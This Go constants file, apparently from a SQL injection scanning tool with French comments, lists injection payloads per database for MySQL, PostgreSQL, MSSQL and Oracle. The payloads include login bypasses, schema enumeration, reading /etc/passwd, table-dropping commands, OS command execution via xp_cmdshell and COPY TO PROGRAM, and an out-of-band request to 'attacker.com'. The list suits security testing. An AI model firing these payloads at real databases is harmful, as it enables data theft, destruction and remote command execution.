// internal/config/constants.go
package config

// Constantes principales
const (
    SecurityReportsFileName = "reports/report_%s.json"
    InjectionSQLAtester    = "A tester"
    InjectionSQLNonSecurise = "Non sécurisé"
    InjectionSQLSecurise    = "Sécurisé"
)

// SQLInjectionPayloads contient les payloads d'injection SQL par type de base de données
var SQLInjectionPayloads = map[string][]string{
    "MySQL": {
        "' OR '1'='1' --",
        "' UNION SELECT null, version() --",
        "1' UNION SELECT 1,2,3,4 --",
        "' OR SLEEP(5) --",
        "' AND IF(1=1, SLEEP(5), 0) --",
        "' OR LOAD_FILE('/etc/passwd') --",
        "' AND 1=0 UNION SELECT table_name FROM information_schema.tables --",
        "' OR 'x'='x' --",
        "' UNION ALL SELECT null, table_name FROM information_schema.tables WHERE table_schema=database() --",
    },
    "PostgreSQL": {
        "'; DROP TABLE users; --",
        "'; COPY (SELECT '') TO PROGRAM 'cmd.exe' --",
        "'; SELECT pg_sleep(5) --",
        "' OR CAST(pg_sleep(10) AS INTEGER) --",
        "'; SELECT current_database(), current_user --",
        "' OR 'a'='a' --",
        "'; SELECT version(), pg_sleep(5); --",
        "'; COPY (SELECT null) TO PROGRAM 'whoami' --",
    },
    "MSSQL": {
        "'; EXEC sp_MSForEachTable 'DROP TABLE ?' --",
        "' UNION SELECT null, @@version --",
        "'; WAITFOR DELAY '0:0:5' --",
        "'; SELECT * FROM sys.tables --",
        "'; EXEC xp_cmdshell('dir'); --",
        "'; SELECT user_name(), system_user --",
        "' OR 1=1; --",
        "'; EXEC sp_configure 'xp_cmdshell', 1; --",
    },
    "Oracle": {
        "' UNION SELECT null, banner FROM v$version --",
        "' AND 1=UTL_INADDR.GET_HOST_ADDRESS('localhost') --",
        "' UNION SELECT column_name FROM all_tab_columns WHERE table_name = 'USERS' --",
        "' UNION SELECT null FROM dual --",
        "' OR 1=UTL_HTTP.REQUEST('http://attacker.com') --",
        "' OR 1=1 --",
        "'; SELECT username, password FROM all_users --",
        "' UNION SELECT null, sys_context('userenv','instance_name') FROM dual --",
    },
}